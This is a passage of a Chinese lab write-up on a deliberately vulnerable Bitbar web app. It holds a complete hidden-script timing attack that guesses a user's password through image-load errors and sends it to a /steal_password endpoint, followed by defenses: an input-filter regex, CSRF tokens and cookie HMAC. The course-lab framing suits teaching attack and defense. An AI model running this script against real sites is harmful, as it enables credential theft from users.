class="attr">id</span>=<span class="string">&#x27;test&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> dictionary = [<span class="string">`password`</span>, <span class="string">`123456`</span>, <span class="string">`	12345678`</span>, <span class="string">`dragon`</span>, <span class="string">`1234`</span>, <span class="string">`qwerty`</span>, <span class="string">`12345`</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">`test`</span>);</span></span><br><span class="line"><span class="language-javascript">    test.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &gt;&gt;&gt;&gt; HINT: you might want to replace this line with something else. */</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Time elapsed <span class="subst">$&#123;end-start&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (index &lt; dictionary.<span class="property">length</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">        test.<span class="property">src</span> = <span class="string">`hello!`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> analyze server&#x27;s reponse times to guess the password for userx and send your guess to the server &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">    test.<span class="property">src</span> = <span class="string">`hello!`</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">    index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>该代码通过测量向服务器发送不同密码尝试时的响应时间来猜测正确的密码。</p>
<ol>
<li>变量定义:</li>
</ol>
<ul>
<li>dictionary: 包含尝试的密码列表。</li>
<li>index: 用于追踪当前尝试的密码在dictionary中的索引。</li>
<li>test: 获取页面中的<code>&lt;img&gt;</code>元素，用于加载测试请求。</li>
<li>start: 记录开始发送请求的时间。</li>
</ul>
<ol start="2">
<li>错误处理:</li>
</ol>
<ul>
<li>test.onerror: 当<code>&lt;img&gt;</code>元素的src属性设置的URL加载失败时，会触发onerror事件。这里利用这个事件来测量时间差，并尝试下一个密码。</li>
</ul>
<ol start="3">
<li>时间测量:</li>
</ol>
<ul>
<li>在onerror事件中，首先记录当前时间end，然后计算从start到end的时间差，这个时间差被认为是服务器响应的时间。</li>
</ul>
<ol start="4">
<li>密码尝试逻辑:</li>
</ol>
<ul>
<li>如果index小于dictionary的长度，说明还有密码没尝试，会将<code>&lt;img&gt;</code>的src设置为一个新的URL（这里应该是一个带有密码尝试的GET请求，但代码中尚未实现，只是用hello!代替）。</li>
<li>如果所有密码都尝试过了，应该有一个分析服务器响应时间和发送猜测结果到服务器的逻辑，但这部分也未实现。</li>
</ul>
<p>恶意代码的实现思路如下：</p>
<ol>
<li>将恶意脚本包裹在 <span></span> 中并设置 style.display&#x3D;none，从而在页面中不展示；</li>
<li>脚本中通过更新 id&#x3D;’test’ 的 Img.src 属性，来执行登录操作因此，将 src 的 URL 设置为 &#x2F;get_login 请求，使得图片加载失败，进而可以在 onerror 事件发生后进行循环。</li>
<li>当 onerror 事件触发后，使用 times 数组记录上次的响应时间，并伪造新的 src 值以循环触发 onerror 事件；</li>
<li>当 dictionary 被遍历完成后，将从 times 中找出最长响应时间的那一组，构造 XML 请求发送到路由 &#x2F;steal_password。</li>
</ol>
<p>代码内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;display:none&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Img</span> <span class="attr">id</span>=<span class="string">&#x27;test&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> dictionary = [<span class="string">`password`</span>, <span class="string">`123456`</span>, <span class="string">`	12345678`</span>, <span class="string">`dragon`</span>, <span class="string">`1234`</span>, <span class="string">`qwerty`</span>, <span class="string">`12345`</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">`test`</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> username = <span class="string">`userx`</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> times = <span class="keyword">new</span> <span class="title class_">Array</span>();</span></span><br><span class="line"><span class="language-javascript">    test.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &gt;&gt;&gt;&gt; HINT: you might want to replace this line with something else. */</span></span></span><br><span class="line"><span class="language-javascript">      times.<span class="title function_">push</span>(end-start);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (index &lt; dictionary.<span class="property">length</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">        test.<span class="property">src</span> = <span class="string">`http://localhost:3000/get_login?username=<span class="subst">$&#123;username&#125;</span>&amp;password=<span class="subst">$&#123;dictionary[index]&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> analyze server&#x27;s reponse times to guess the password for userx and send your guess to the server &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">const</span> maxTime = <span class="title class_">Math</span>.<span class="title function_">max</span>(...times);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">const</span> maxTimeIndex = times.<span class="title function_">indexOf</span>(maxTime);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">const</span> guessPwd = dictionary[maxTimeIndex];</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">		xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">`http://localhost:3000/steal_password?password=<span class="subst">$&#123;guessPwd&#125;</span>&amp;timeElapsed=<span class="subst">$&#123;maxTime&#125;</span>`</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">		xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">		</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">    test.<span class="property">src</span> = <span class="string">`http://localhost:3000/get_login?username=<span class="subst">$&#123;username&#125;</span>&amp;password=<span class="subst">$&#123;dictionary[index]&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">    index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>登陆attacker账户，在转账对象输入为恶意代码：<br><img src="/figure/attack7_1.png" alt="attack7_1"></p>
<p>查看终端信息，可以看到userx的password为dragon，响应时间为2546ms&gt;2000ms，符合要求：<br><img src="/figure/attack7_2.png" alt="attack7_2"></p>
<h2 id="第二部分：防御方法"><a href="#第二部分：防御方法" class="headerlink" title="第二部分：防御方法"></a>第二部分：防御方法</h2><h2 id="现在您已经了解-Bitbar-网络应用程序到底有多不安全，您将修改该应用程序以抵御第-1-部分中的攻击（您将永远不会在自己的网络应用程序中犯这些错误！）。每种攻击的实现方法可能不止一种，因此请考虑其他可能的攻击方法–您需要防御所有这些方法。-提示-如果检测到-CSRF-或-cookie-被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。-在服务器进程内存中将密钥作为-JavaScript-变量是可以接受的。-您无需防御-cookie-重放攻击。-由于我们不要求您使用-TLS，因此您可以认为-Cookie-不会被网络攻击者窃取。-实现提示-总体提示-如果检测到-CSRF-或-cookie-被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。-在服务器进程内存中将密钥作为-JavaScript-变量是可以接受的。-您无需防御-cookie-重放攻击。-由于我们不要求您使用-TLS，因此您可以认为-Cookie-不会被网络攻击者窃取。"><a href="#现在您已经了解-Bitbar-网络应用程序到底有多不安全，您将修改该应用程序以抵御第-1-部分中的攻击（您将永远不会在自己的网络应用程序中犯这些错误！）。每种攻击的实现方法可能不止一种，因此请考虑其他可能的攻击方法–您需要防御所有这些方法。-提示-如果检测到-CSRF-或-cookie-被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。-在服务器进程内存中将密钥作为-JavaScript-变量是可以接受的。-您无需防御-cookie-重放攻击。-由于我们不要求您使用-TLS，因此您可以认为-Cookie-不会被网络攻击者窃取。-实现提示-总体提示-如果检测到-CSRF-或-cookie-被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。-在服务器进程内存中将密钥作为-JavaScript-变量是可以接受的。-您无需防御-cookie-重放攻击。-由于我们不要求您使用-TLS，因此您可以认为-Cookie-不会被网络攻击者窃取。" class="headerlink" title="现在您已经了解 Bitbar 网络应用程序到底有多不安全，您将修改该应用程序以抵御第 1 部分中的攻击（您将永远不会在自己的网络应用程序中犯这些错误！）。每种攻击的实现方法可能不止一种，因此请考虑其他可能的攻击方法–您需要防御所有这些方法。### 提示- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。- 您无需防御 cookie 重放攻击。- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。### 实现提示#### 总体提示- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。- 您无需防御 cookie 重放攻击。- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。"></a>现在您已经了解 Bitbar 网络应用程序到底有多不安全，您将修改该应用程序以抵御第 1 部分中的攻击（您将永远不会在自己的网络应用程序中犯这些错误！）。每种攻击的实现方法可能不止一种，因此请考虑其他可能的攻击方法–您需要防御所有这些方法。<br>### 提示<br>- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。<br>- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。<br>- 您无需防御 cookie 重放攻击。<br>- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。<br><br>### 实现提示<br>#### 总体提示<br>- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。<br>- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。<br>- 您无需防御 cookie 重放攻击。<br>- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。</h2><h4 id="Alpha-防御"><a href="#Alpha-防御" class="headerlink" title="Alpha 防御"></a>Alpha 防御</h4><ul>
<li>如果您检测到注入的用户名与您定义的” 有效” 用户名不符，则无需在错误消息中显示该无效用户名。</li>
</ul>
<h4 id="Beta-防御"><a href="#Beta-防御" class="headerlink" title="Beta 防御"></a>Beta 防御</h4><ul>
<li>如果攻击者通过简单的 GET 请求来恢复为受害者用户设计的 CSRF 令牌，则无需进行防御。</li>
<li>CSRF 标记的寿命越短越好。</li>
</ul>
<h4 id="Foxtrot-防御"><a href="#Foxtrot-防御" class="headerlink" title="Foxtrot 防御"></a>Foxtrot 防御</h4><ul>
<li>对于这种攻击，您应该使用与 CSP 相关的防御方法。为此，您可以在app.js中添加一些行（但不必这样做）。</li>
<li>我们将使用 4-5 个测试用例配置文件来测试您的防御能力，这些配置文件会使用一些最常见的 XSS 方法。</li>
</ul>
<h3 id="实现要求"><a href="#实现要求" class="headerlink" title="实现要求"></a>实现要求</h3><ul>
<li>您只能在 router.js 中实施防御，但有两个例外：您也可以更改 views&#x2F; 中的任何文件，以添加 CSRF 保密令牌防御和修改 <code>&lt;script&gt;</code> 标记的属性（请参阅下文有关在 views&#x2F; 中更改的特殊限制），您还可以更改 app.js 以实施foxtrot防御。所有其他文件必须保持不变。</li>
<li>在正常输入时，不要更改网站的外观或行为。非恶意用户应该不会注意到你修改后的网站有什么不同。</li>
<li>当出现不良输入时，网站应以用户友好的方式失效。您可以对输入进行消毒或显示错误信息，不过在大多数情况下，消毒可能是对用户更友好的选择。</li>
<li>不要启用 Express.js 的内置防御功能。Express.js 自带了许多内置防御功能，但在第 1 部分中已禁用。这些内置防御必须保持禁用状态。虽然在现实世界中，最好使用标准的、经过审核的防御代码，而不是自己实现，但我们还是希望你能在实践中实现这些防御。具体来说，这意味着您不能：<br>– 使用 Express.js 更改已在 app.js 中设置的 CORS 策略，<br>– 在 views&#x2F; 内的任何文件中执行更严格的 EJS 转义策略，<br>– 添加启动代码中提供的 Node 软件包之外的任何其他 Node 软件包。</li>
<li>注意：你可以在 views&#x2F; 内的文件中添加 CSRF 秘密令牌。您也可以在views&#x2F;中的 <code>&lt;script&gt;</code> 标记中添加 nonce 属性。但是，不要修改这些文件中的<code>&lt;%-</code>标记，以实现更严格的 EJS 转义功能。</li>
<li>不要过度消毒输入。允许使用默认 JavaScript 函数对输入进行消毒，但要确保不会过度消毒（例如，profile仍应允许使用同一组经过消毒的 HTML 标记）。</li>
</ul>
<p>我们强烈建议在防御中使用从”.&#x2F;utils&#x2F;crypto ” 导入的函数。具体来说，请考虑如何使用 generateRandomness 和 HMAC 函数分别防止 CSRF 和 cookie 篡改。</p>
<p>最后，请在 README.txt 文件中描述您的防御措施。第 1 部分中的每个漏洞用几句话描述即可。我们将阅读您的 README.txt 和源代码，并测试第 1 部分中的攻击是否可能。这意味着，如果您的防御非常特别或不健全，即使第 1 部分中的相关攻击被阻止，您的防御也有可能不得分。</p>
<h3 id="Alpha-防御-1"><a href="#Alpha-防御-1" class="headerlink" title="Alpha 防御"></a>Alpha 防御</h3><h4 id="网页漏洞"><a href="#网页漏洞" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>没有对输入进行处理从而导致恶意js代码能够窃取cookie并输送到其他网址。</p>
<h4 id="代码完善"><a href="#代码完善" class="headerlink" title="代码完善"></a>代码完善</h4><p>该部分需要补充对 GET 请求传入的username参数的检查。首先，在请求包中通常会将特殊字符串进行编码（例如%3C 表示 &lt;，%3D 表示 &#x3D;<br>），因此将获取的 username 参数首先进行 URI 解码，以便后续对于特殊字符的过滤；其次，构造invalidChars正则表达式，其中包含常见非法字符；最后，对解码后的输入进行正则表达式匹配，若用户名中包含非法字符串则反馈错误信息。</p>
<p>再次使用 a.txt 窃取用户Cookie发现被阻止了，在页面显示了错误信息’Invalid user name input!’：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Alpha defense: decode the input username and test for filtering */</span></span><br><span class="line">  <span class="keyword">const</span> decodedUsername = <span class="built_in">decodeURIComponent</span>(req.<span class="property">query</span>.<span class="property">username</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">  <span class="keyword">const</span> invaildChars = <span class="regexp">/[&lt;&gt;; &#x27;``\$&#123;&#125;().\/]/g</span>;</span><br><span class="line">  <span class="keyword">if</span>(invaildChars.<span class="title function_">test</span>(decodedUsername)) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;profile/view&#x27;</span>, <span class="string">&#x27;View Profile&#x27;</span>, <span class="string">&#x27;Invalid user name input!&#x27;</span>, req.<span class="property">session</span>.<span class="property">account</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/figure/defense1_1.png" alt="defense1_1"></p>
<h3 id="Bravo-防御"><a href="#Bravo-防御" class="headerlink" title="Bravo 防御"></a>Bravo 防御</h3><h4 id="网页漏洞-1"><a href="#网页漏洞-1" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>通过<code>xhr.withCredentials = true;</code>，credentials，即用户凭证，是指 cookie、HTTP 身份验证和 TLS 客户端证书。当 withCredentials 设置为true，在跨域请求时，会携带用户凭证，即 Cookie 信息。这使得攻击者不需要显式地知道用户的账号密码，也可以伪造用户身份。</p>
<h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><h5 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h5><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a target="_blank" rel="noopener" href="http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory%EF%BC%8C%E7%94%A8%E6%88%B7%E5%BF%85%E9%A1%BB%E5%85%88%E7%99%BB%E9%99%86">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<h5 id="在请求地址中添加-token-并验证-Anti-CSRF-token"><a href="#在请求地址中添加-token-并验证-Anti-CSRF-token" class="headerlink" title="在请求地址中添加 token 并验证(Anti-CSRF token)"></a>在请求地址中添加 token 并验证(Anti-CSRF token)</h5><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<h5 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h5><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
<h4 id="代码完善-1"><a href="#代码完善-1" class="headerlink" title="代码完善"></a>代码完善</h4><p>本文采用的是第二种防御方式，即使用 CSRF 令牌。</p>
<p>首先，在 code&#x2F;router.js&#x2F;transfer 中添加如下代码，在用户点击转账页面时设置一个随机的 CSRF 令牌，存储在用户会话中，且不可猜测。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bravo defense: generate the CSRF token and store to the transfer from */</span></span><br><span class="line">  <span class="keyword">const</span> csrfToken = <span class="title function_">generateRandomness</span>();</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">csrfToken</span> = csrfToken;</span><br></pre></td></tr></table></figure>

<p>其次，在 code&#x2F;views&#x2F;pages&#x2F;tranfer&#x2F;form.ejs 中更新表单内容。当用户点击进入转账页面时会将 csrfToken 填充到一个隐藏的表项，这个表项会随着用户确认转账后用于令牌验证。<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="title class_">Bravo</span> <span class="attr">defense</span>: add <span class="title function_">csrf_token</span>(invisiable) to the form --&gt;</span><br><span class="line"> <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= result.csrfToken %&gt;&quot;</span>/&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>最后，在 code&#x2F;router.js&#x2F;post_transfer 中加入对令牌验证的代码，当传入的令牌值与存储的令牌值不同时则认为是恶意请求，拒绝转账，当令牌验证失败时直接退出账号。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bravo defense: check the CSRF token with the server session */</span></span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">csrfToken</span> || req.<span class="property">body</span>.<span class="property">csrf_token</span> != req.<span class="property">session</span>.<span class="property">csrfToken</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">false</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">account</span> = &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">csrfToken</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>, <span class="string">&#x27;Logged out successfully!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Charlie-和-Delta-防御"><a href="#Charlie-和-Delta-防御" class="headerlink" title="Charlie 和 Delta 防御"></a>Charlie 和 Delta 防御</h3><h4 id="网页漏洞-2"><a href="#网页漏洞-2" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>Cookie 窃取漏洞，即会话劫持，意味着攻击者可以窃取或拦截用户的会话 Cookie，从而能够以用户的身份访问或操作网站。</p>
<h4 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h4><h5 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h5><p>在现代的网络中，身份认证是一个经常会用到的功能，在身份认证过程中，有很多种方式可以保证用户信息的安全，而MAC(message authentication code)就是一种常用的方法。</p>
<p>消息认证码是对消息进行认证并确认其完整性的技术。通过使用发送者和接收者之间共享的密钥，就可以识别出是否存在伪装和篡改行为。</p>
<p>MAC是通过MAC算法+密钥+要加密的信息一起计算得出的。HMAC是Keyed-Hashing for Message Authentication的缩写。HMAC的MAC算法是hash算法，它可以是MD5, SHA-1或者 SHA-256，他们分别被称为HMAC-MD5，HMAC-SHA1， HMAC-SHA256。</p>
<p>hmac的使用过程往往是： </p>
<ol>
<li>客户端发出登录请求（假设是浏览器的GET请求） </li>
<li>服务器返回一个随机值，并在会话中记录这个随机值 </li>
<li>客户端将该随机值作为密钥，用户密码进行hmac运算，然后提交给服务器 </li>
<li>服务器读取用户数据库中的用户密码和步骤2中发送的随机值做与客户端一样的hmac运算，然后与用户发送的结果比较，如果结果一致则验证用户合法。</li>
</ol>
<h4 id="代码完善-2"><a href="#代码完善-2" class="headerlink" title="代码完善"></a>代码完善</h4><p>首先，在router中设置私钥并创建基本的 HMAC 工具函数：:<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Charlie and Delta defense: use HMAC to check whether cookie is tampered */</span></span><br><span class="line"><span class="keyword">const</span> secretKey =  <span class="title function_">generateRandomness</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setHMAC</span>(<span class="params">session</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(session.<span class="property">loggedIn</span>) + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(session.<span class="property">account</span>);</span><br><span class="line">  <span class="keyword">const</span> hmac = <span class="title function_">HMAC</span>(secretKey, data);</span><br><span class="line">  <span class="keyword">return</span> hmac;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkHMAC</span>(<span class="params">session</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(session.<span class="property">loggedIn</span>) + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(session.<span class="property">account</span>);</span><br><span class="line">  <span class="keyword">const</span> _hmac = <span class="title function_">HMAC</span>(secretKey, data);</span><br><span class="line">  <span class="keyword">const</span> hmac = session.<span class="property">hmac</span>;</span><br><span class="line">  <span class="keyword">if</span>(_hmac === hmac) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span 